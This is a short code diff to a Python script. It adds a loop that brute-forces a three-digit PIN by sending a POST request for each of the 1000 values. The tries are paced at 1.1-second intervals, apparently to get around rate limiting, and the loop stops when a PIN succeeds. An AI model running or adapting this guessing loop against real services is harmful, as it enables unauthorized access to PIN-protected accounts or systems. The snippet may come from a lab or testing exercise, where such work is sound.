@@ -48,6 +48,13 @@ def send_post_request(pin):
     else:
         print(f"Trying PIN: {pin_guess}")
         return False
+    
+def brute_force_pins():
+    for pin in range(1000):
+        if send_post_request(pin):
+            print(f"Found correct PIN: {pin:03d}")
+            break
+        time.sleep(1.1)
 
 if __name__ == "__main__":
-    send_post_request()
+    brute_force_pins()
